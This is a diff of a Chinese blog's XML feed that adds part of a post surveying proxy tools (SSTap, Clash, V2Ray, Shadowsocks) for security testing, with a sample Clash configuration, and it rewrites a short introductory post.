+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/%E9%80%82%E9%85%8D%E5%99%A8.png" class title="This is an example image">
+
+<p>软件大概长这个样子：</p>
+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/SSTap.png" class title="This is an example image">
+
+<p><strong>0x02.clash for windows（各版本）</strong></p>
+<p>这款应该是比较多人知道的了。从测试角度来讲，这款软件也比较容易配置走全局，代理日志文件也方便查看。比如AWVS扫描想走指定代理，虽然AWVS是内置浏览器发起请求，但将流量转发到代理更加保险和方便查看。</p>
+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/clash.png" class title="This is an example image">
+
+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/awvvs.png" class title="This is an example image">
+
+<p>此软件也能够使用增强模式(Enhanced Mode)实现全局代理。Windows和Mac的设置不相同。</p>
+<p>Windows设置方法</p>
+<p>2.1.安装Tap Device</p>
+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/clash%E4%B8%BB%E7%95%8C%E9%9D%A2.png" class title="This is an example image">
+
+<p>2.2.修改配置文件</p>
+<img src="/2022/09/03/%E5%90%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BB%A3%E7%90%86%E5%9C%BA%E6%99%AF/profiles-edit.png" class title="This is an example image">
+
+<p>port: 7890<br>socks-port: 7891<br>redir-port: 7892<br>allow-lan: true<br>mode: Rule<br>log-level: silent<br>external-controller: 127.0.0.1:9090<br>secret: “”<br>dns:<br>   enable: true<br>   enhanced-mode: redir-host # 或 fake-ip<br>   listen: 0.0.0.0:53<br>   nameserver:</p>
+<pre><code>  - 223.5.5.5
+</code></pre>
+<p>interface-name: 以太网</p>
+<p>重点是后面这段，添加后能在发现多了个全局网卡</p>
+<p>Mac设置方法:</p>
+<p>直接点击菜单栏的增强模式(Enhanced Mode)，轻松就实现了proxifier的全局功能！命令行、Android Studio等各种工具，全部都能走代理，并且是按照Clash中设定的路由规则智能直连或者代理，非常的方便！</p>
+<p><strong>0x03.v2ary（各版本）</strong></p>
+<p>v2ary有更多可选择的协议 &#x2F; 传输载体 (Socks、HTTP、TLS、TCP、mKCP、WebSocket )，还有强大的路由功能，不仅仅于此，它亦包含 Shadowsocks 组件，你只需要安装 V2Ray，你就可以使用所有的 V2Ray 相关的特性包括使用 Shadowsocks，由于 V2Ray 是使用 GO 语言所撰写的，天生的平台部署优势，下载即可使用。</p>
+<p><strong>0x04.Shadowsocks（各版本）</strong></p>
+<p>挺经典的软件了，可能大家都用过这里就不过多介绍了。支持SS&#x2F;SSR节点信息。</p>
+]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>安全测试工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>征途上，新的开始</title>
-    <url>/2022/08/29/hello-world/</url>
-    <content><![CDATA[<p>之前就看过用Github搭建博客，借此记录自己之前在各平台发的文章，也更好地促进自己吸收再输出。</p>
+    <url>/2022/08/29/%E5%BE%81%E9%80%94%E4%B8%8A%EF%BC%8C%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
+    <content><![CDATA[<p>For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</p>
+<p>对我来说，一件尚未实现的事，就是我有生之年的最大鞭策。</p>
 ]]></content>
   </entry>
   <entry>
